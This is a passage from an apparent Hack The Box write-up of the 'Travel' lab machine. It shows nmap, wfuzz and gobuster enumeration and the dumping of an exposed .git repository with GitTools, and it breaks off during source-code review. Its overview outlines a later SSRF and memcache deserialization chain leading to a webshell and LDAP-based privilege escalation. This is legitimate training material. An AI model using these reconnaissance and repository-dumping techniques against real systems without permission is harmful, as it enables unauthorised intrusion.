@@ -1,0 +1,1508 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Travel</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-travel">htb-travel</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#wordpress">wordpress</a> <a class="post-tag" href="/tags#awesome-rss">awesome-rss</a> <a class="post-tag" href="/tags#simplepie">simplepie</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#gittools">gittools</a> <a class="post-tag" href="/tags#git-dumper">git-dumper</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#memcached">memcached</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#filter">filter</a> <a class="post-tag" href="/tags#deserialization">deserialization</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#gopher">gopher</a> <a class="post-tag" href="/tags#gopherus">gopherus</a> <a class="post-tag" href="/tags#payloadsallthethings">payloadsallthethings</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#container">container</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#database">database</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#password-reuse">password-reuse</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#viminfo">viminfo</a> <a class="post-tag" href="/tags#ldap">ldap</a> <a class="post-tag" href="/tags#authorizedkeyscommand">authorizedkeyscommand</a> <a class="post-tag" href="/tags#ldif">ldif</a> <a class="post-tag" href="/tags#ldapadd">ldapadd</a> <a class="post-tag" href="/tags#getent">getent</a> <a class="post-tag" href="/tags#htb-ypuffy">htb-ypuffy</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-09-12T13:45:00+00:00" itemprop="datePublished">Sep 12, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/09/12/htb-travel.html" style="color: #e6e6e6; text-decoration: none;">HTB: Travel</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/travel-cover.webp" type="image/webp"/>
+<img alt="Travel" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/travel-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Travel was just a great box because it provided a complex and challenging puzzle with new pieces that were fun to explore. I’ll start off digging through various vhosts until I eventually find an exposed .git folder on one. That provides me the source for another, which includes a custom RSS feed that’s cached using memcache. I’ll evaluate that code to find a deserialization vulnerability on the read from memcache. I’ll create an exploit using a server-side request forgery attack to poison the memcache with a serialized PHP payload that will write a webshell, and then trigger it, gaining execution and eventually a shell inside a container. I’ll find a hash in the database which I can crack to get a password for the user on the main host. This user is also the LDAP administrator, and SSH is configured to check LDAP for logins. I’ll pick an arbitrary user and add an SSH private key, password, and the sudo group to their LDAP such that then when I log in as that user, I can just sudo to root. In Beyond Root I’ll explore a weird behavior I observed in the RSS feed.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/252 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/travel" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Travel</a> <a href="https://hackthebox.com/machines/travel" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-travel.webp" type="image/webp"/> <img alt="Travel" class="img-av" src="/icons/box-travel.png"/></picture></a><br/><a href="https://hackthebox.com/machines/travel" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1260909118459711488">16 May 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">12 Sep 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/travel-diff.webp" type="image/webp"/><img alt="Rated difficulty for Travel" src="/img/travel-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/travel-radar.webp" type="image/webp"/><img alt="Radar chart for Travel" src="/img/travel-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">05:05:23</span><a href="https://app.hackthebox.com/users/103578" rel="noopener" target="_blank"><img alt="qtc" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/103578" style="display: unset"/><span class="user-text" style="display: none"> qtc</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">08:48:52</span><a href="https://app.hackthebox.com/users/103578" rel="noopener" target="_blank"><img alt="qtc" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/103578" style="display: unset"/><span class="user-text" style="display: none"> qtc</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/> <a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.189
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 14:06 EDT
+Nmap scan report for 10.10.10.189
+Host is up (0.014s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,443 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.189
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 14:17 EDT
+Nmap scan report for 10.10.10.189
+Host is up (0.013s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB
+443/tcp open  ssl/http nginx 1.17.6
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB - SSL coming soon.
+| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+| Not valid before: 2020-04-23T19:24:29
+|_Not valid after:  2030-04-21T19:24:29
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
+
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely the first HTB machine to run Ubuntu 20.04 Focal. The <a href="https://packages.ubuntu.com/search?keywords=nginx">NGINX version</a> is pretty close there as well.</p>
+<p>The TLS port is showing a certificate with <code class="language-plaintext highlighter-rouge">travel.htb</code>, <code class="language-plaintext highlighter-rouge">www.travel.htb</code>, <code class="language-plaintext highlighter-rouge">blog.travel.htb</code>, and <code class="language-plaintext highlighter-rouge">blog-dev.travel.htb</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">blog-dev.travel.htb</code> just returns a 403 Forbidden error.</p>
+<h3 id="scan-for-virtual-hosts">Scan for Virtual Hosts</h3>
+<p>Seeing the various different DNS names, I started a scan right away for others. The default case is 5093 bytes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> http://10.10.10.189 | <span class="nb">wc</span> 
+<span class="go">    144     458    5093
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> http://travel.htb | <span class="nb">wc</span> 
+<span class="go">    144     458    5093
+</span></code></pre></div></div>
+<p>Of the subdomains I already know about, <code class="language-plaintext highlighter-rouge">www</code> seems to match that default, whereas <code class="language-plaintext highlighter-rouge">blog</code> and <code class="language-plaintext highlighter-rouge">blog-dev</code> are different:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> subdomains <span class="nt">-u</span> http://10.10.10.189 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.travel.htb"</span>
+<span class="go">
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.189/
+Total requests: 3
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000001:   200        144 L    458 W    5093 Ch     "www"
+000000003:   403        7 L      9 W      154 Ch      "blog-dev"
+000000002:   200        345 L    1408 W   24462 Ch    "blog"
+
+Total time: 0.083828
+Processed Requests: 3
+Filtered Requests: 0
+Requests/sec.: 35.78737
+</span></code></pre></div></div>
+<p>Running over a larger word list reveals one more, <code class="language-plaintext highlighter-rouge">ssl</code>:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt <span class="nt">-u</span> http://10.10.10.189 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.travel.htb"</span> <span class="nt">--hh</span> 5093
+<span class="go">
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.189/
+Total requests: 100000
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000004:   200        345 L    1408 W   24462 Ch    "blog"
+000000078:   200        51 L     126 W    1123 Ch     "ssl"
+000099358:   403        7 L      9 W      154 Ch      "blog-dev"
+                                                          
+Total time: 387.3847
+Processed Requests: 100000  
+Filtered Requests: 99997
+Requests/sec.: 258.1412
+</span></code></pre></div></div>
+<h3 id="wwwtravelhtb---tcp-80">www.travel.htb - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The main site is for a travel goods company that hasn’t launched yet:</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20200518142736039.png">
+<img alt="image-20200518142736039" src="https://0xdfimages.gitlab.io/img/image-20200518142736039.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="https://0xdfimages.gitlab.io/img/image-20200518142736039.png"><i>Click for full image</i></a></div>
+</div>
+<p>I’ll test different extensions to reveal that the index page is <code class="language-plaintext highlighter-rouge">index.html</code>. Submitting to the Subscribe form just links to <code class="language-plaintext highlighter-rouge">index.html?email=[submitted address]</code>, which seems unlikely to lead to any actions on the server.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">gobuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x html,php</code> since I know the index is HTML, and PHP seems potentially likely on this kind of box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://travel.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 40 <span class="nt">-x</span> html,php <span class="nt">-o</span> scans/gobuster-travel.htb-medium-html_php
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://travel.htb
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php
+[+] Timeout:        10s
+===============================================================
+2020/05/18 14:40:28 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/img (Status: 301)
+/css (Status: 301)
+/lib (Status: 301)
+/js (Status: 301)
+/newsfeed (Status: 301)
+===============================================================
+2020/05/18 14:56:30 Finished
+===============================================================
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/newsfeed</code> is interesting, but it returns 403.</p>
+<h3 id="blogtravelhtb---tcp-80">blog.travel.htb - TCP 80</h3>
+<h4 id="site-1">Site</h4>
+<p>The site is a WordPress blog:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200518145355485.webp" type="image/webp"/>
+<img alt="image-20200518145355485" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200518145355485.png"/>
+</picture>
+<p>I’ll note the username, admin, as well as the multiple references to RSS feeds. The page source contains a comment in the source about moving from dev to prod:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style </span><span class="na">id=</span><span class="s">"wp-custom-css"</span><span class="nt">&gt;</span>
+            <span class="c">/* I am really not sure how to include a custom CSS file
+ * in wordpress. I am including it directly via Additional CSS for now.
+ * TODO: Fixme when copying from -dev to -prod. */</span>
+
+<span class="k">@import</span> <span class="sx">url(http://blog-dev.travel.htb/wp-content/uploads/2020/04/custom-css-version#01.css)</span><span class="p">;</span>        <span class="nt">&lt;/style&gt;</span>
+</code></pre></div></div>
+<p>Looking at the RSS feed, I see the same post that’s linked to in “Recent Posts”. There’s an “Awesome RSS” link at the top right, and it links to nine additional posts:</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20200909135251619.png">
+<img alt="image-20200909135251619" src="https://0xdfimages.gitlab.io/img/image-20200909135251619.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="https://0xdfimages.gitlab.io/img/image-20200909135251619.png"><i>Click for full image</i></a></div>
+</div>
+<p>All of the links just point back to <code class="language-plaintext highlighter-rouge">/awesome-rss</code>. It is strange that these seem to be coming from a different RSS feed than the rest of the site.</p>
+<h4 id="wpscan">wpscan</h4>
+<p>As this is a WordPress site, I ran <code class="language-plaintext highlighter-rouge">wpscan</code> against it. There wasn’t a ton of useful info. There’s a <code class="language-plaintext highlighter-rouge">robots.txt</code> file that does allow <code class="language-plaintext highlighter-rouge">/wp-admin/admin-ajax.php</code>. However, it seems <a href="https://wordpress.stackexchange.com/questions/77407/how-does-admin-ajax-php-work">that page is supposed to be available publicly facing</a>. It identifies the version as 5.4, which is 1.5 months old. There is a newer version from April 29 (17 days before release), but reading the <a href="https://wordpress.org/support/wordpress-version/version-5-4-1/#list-of-files-revised">WordPress Changelog</a> for version 5.4.1, there doesn’t seem to be any <a href="https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/">security issues</a> I’m interested in. The WP theme of twentytwenty is 1.3, which is also one version out of date. The newest version was released <a href="https://themes.trac.wordpress.org/log/twentytwenty/">two days before Travel</a>, and there are no interesting security patches in there either.</p>
+<p>It does identify the user Admin, just as I had earlier.</p>
+<h3 id="ssltravelhtb">ssl.travel.htb</h3>
+<p>The site just warns the the SSL isn’t working yet:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200518151826579.webp" type="image/webp"/>
+<img alt="image-20200518151826579" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200518151826579.png"/>
+</picture>
+<p>The note is signed by admin.</p>
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> here with <code class="language-plaintext highlighter-rouge">.html</code> and <code class="language-plaintext highlighter-rouge">.php</code> didn’t find anything other than <code class="language-plaintext highlighter-rouge">index.html</code>.</p>
+<h3 id="https-sites---tcp-443">HTTPS Sites - TCP 443</h3>
+<p>Trying to visit any of these in Firefox returns the same page as <code class="language-plaintext highlighter-rouge">ssl.travel.htb</code>. Trying to visit through Burp returns an error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200518160334896.webp" type="image/webp"/>
+<img alt="image-20200518160334896" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200518160334896.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">curl</code> returns the page, but <code class="language-plaintext highlighter-rouge">wfuzz</code> also breaks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> subdomains <span class="nt">-u</span> https://10.10.10.189 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.travel.htb"</span>
+<span class="go">
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://10.10.10.189/
+Total requests: 3
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+Fatal exception: Pycurl error 35: gnutls_handshake() failed: Error in protocol version
+</span></code></pre></div></div>
+<p>This must be part of what the note referred to as broken.</p>
+<h3 id="blog-devtravelhtb">blog-dev.travel.htb</h3>
+<h4 id="nmap-1">nmap</h4>
+<p>The root for this subdomain returns 403 forbidden, which might be due to the comment above about moving from dev to prod. I spent a lot of time enumerating everything else before finally turning back to look at <code class="language-plaintext highlighter-rouge">blog-dev.travel.htb</code>. <code class="language-plaintext highlighter-rouge">gobuster</code> with my typical wordlist didn’t find anything, but eventually I ran <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 80 <span class="nt">-sC</span> <span class="nt">-sV</span> blog-dev.travel.htb
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 16:57 EDT
+Nmap scan report for blog-dev.travel.htb (10.10.10.189)
+Host is up (0.036s latency).
+rDNS record for 10.10.10.189: travel.htb
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.17.6
+| http-git: 
+|   10.10.10.189:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: moved to git 
+|_http-server-header: nginx/1.17.6
+|_http-title: 403 Forbidden
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds
+</span></code></pre></div></div>
+<p>This is a really good lesson learned. I never check for things like <code class="language-plaintext highlighter-rouge">robots.txt</code> or <code class="language-plaintext highlighter-rouge">.git/</code> because I count on <code class="language-plaintext highlighter-rouge">nmap</code> to find them for me. But it doesn’t check all the vhosts, so when dealing with vhosts, I should give each a quick run with <code class="language-plaintext highlighter-rouge">nmap -sC</code>.</p>
+<h4 id="manual-look">Manual Look</h4>
+<p>With <code class="language-plaintext highlighter-rouge">curl</code> or Firefox, trying to visit <code class="language-plaintext highlighter-rouge">http://blog-dev.travel.htb</code> just returns 403 Forbidden:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://blog-dev.travel.htb
+<span class="go">&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.17.10&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>Still, I know that the script in <code class="language-plaintext highlighter-rouge">nmap</code> was able to get information about the repo, like that it has no name, and the last commit message.</p>
+<p>If I look inside the <code class="language-plaintext highlighter-rouge">.git</code> repository for this blog, I see a bunch of files there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">~/0xdf.gitlab.io/.git$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">branches  COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  ORIG_HEAD  packed-refs  refs
+</span></code></pre></div></div>
+<p>If I retrieve <code class="language-plaintext highlighter-rouge">HEAD</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://blog-dev.travel.htb/.git/HEAD
+<span class="go">ref: refs/heads/master
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">description</code> matches what was in the script results:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://blog-dev.travel.htb/.git/description
+<span class="gp">Unnamed repository;</span><span class="w"> </span>edit this file <span class="s1">'description'</span> to name the repository.
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">config</code> on my host gives all the branches:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">~/0xdf.gitlab.io/.git$</span><span class="w"> </span><span class="nb">cat </span>config 
+<span class="go">[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = git@gitlab.com:0xdf/0xdf.gitlab.io.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "master"]
+        remote = origin
+        merge = refs/heads/master
+[branch "rope"]
+        remote = origin
+        merge = refs/heads/rope
+[branch "fatty"]
+        remote = origin
+        merge = refs/heads/fatty
+[branch "arctic"]
+        remote = origin
+        merge = refs/heads/arctic
+</span></code></pre></div></div>
+<p>On Travel, there must not be any branches or an origin (remote like GitHub or Gitlab):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://blog-dev.travel.htb/.git/config
+<span class="go">[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+</span></code></pre></div></div>
+<p>I can get a username, <code class="language-plaintext highlighter-rouge">jane@travel.htb</code>, from the logs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl http://blog-dev.travel.htb/.git/logs/HEAD
+<span class="go">0000000000000000000000000000000000000000 0313850ae948d71767aff2cc8cc0f87a0feeef63 jane &lt;jane@travel.htb&gt; 1587458094 -0700      commit (initial): moved to git
+</span></code></pre></div></div>
+<p>I get a 403 when I try to list any of the directories.</p>
+<h4 id="automated-clone">Automated Clone</h4>
+<p>I’ll use <a href="https://github.com/internetwache/GitTools">GitTools</a> to pull the repo. First I’ll clone it to my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt#</span><span class="w"> </span>git clone https://github.com/internetwache/GitTools.git
+<span class="go">Cloning into 'GitTools'...
+remote: Enumerating objects: 27, done.
+remote: Counting objects: 100% (27/27), done.
+remote: Compressing objects: 100% (20/20), done.
+remote: Total 191 (delta 7), reused 20 (delta 7), pack-reused 164
+Receiving objects: 100% (191/191), 43.65 KiB | 7.27 MiB/s, done.
+Resolving deltas: 100% (68/68), done.
+</span></code></pre></div></div>
+<p>Now I can use the <code class="language-plaintext highlighter-rouge">gitdumper.sh</code> script to get the repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>/opt/GitTools/Dumper/gitdumper.sh http://blog-dev.travel.htb/.git/ git
+<span class="c">###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+</span><span class="go">
+
+[*] Destination folder does not exist
+[+] Creating git/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[-] Downloaded: /refs/wip/index/refs/heads/master
+[-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f
+[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9
+[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
+[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
+</span></code></pre></div></div>
+<h4 id="access-files">Access Files</h4>
+<p>Now in the <code class="language-plaintext highlighter-rouge">git</code> directory, there is only the <code class="language-plaintext highlighter-rouge">.git</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span>
+<span class="go">.  ..  .git
+</span></code></pre></div></div>
+<p>I can run <code class="language-plaintext highlighter-rouge">git status</code> and see that since the last commit, three files are missing (which is because there are currently not files in there):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>git status 
+<span class="go">On branch master
+Changes not staged for commit:
+  (use "git add/rm &lt;file&gt;..." to update what will be committed)
+  (use "git restore &lt;file&gt;..." to discard changes in working directory)
+        deleted:    README.md
+        deleted:    rss_template.php
+        deleted:    template.php
+
+no changes added to commit (use "git add" and/or "git commit -a")
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">git reset --hard</code> will reset to the last commit, which restores the three files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>git reset <span class="nt">--hard</span> 
+<span class="go">HEAD is now at 0313850 moved to git
+
+</span><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">README.md  rss_template.php  template.php
+</span></code></pre></div></div>
+<h3 id="source-code-analysis">Source Code Analysis</h3>
+<h4 id="readme">README</h4>
+<p><code class="language-plaintext highlighter-rouge">README.md</code> presents install instructions as well as the current status and todo:</p>
+<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh"># Rss Template Extension</span>
+
+Allows rss-feeds to be shown on a custom wordpress page.
+
+<span class="gu">## Setup</span>
+<span class="p">
+*</span> <span class="sb">`git clone https://github.com/WordPress/WordPress.git`</span>
+<span class="p">*</span> copy rss_template.php &amp; template.php to <span class="sb">`wp-content/themes/twentytwenty`</span> 
+<span class="p">*</span> create logs directory in <span class="sb">`wp-content/themes/twentytwenty`</span> 
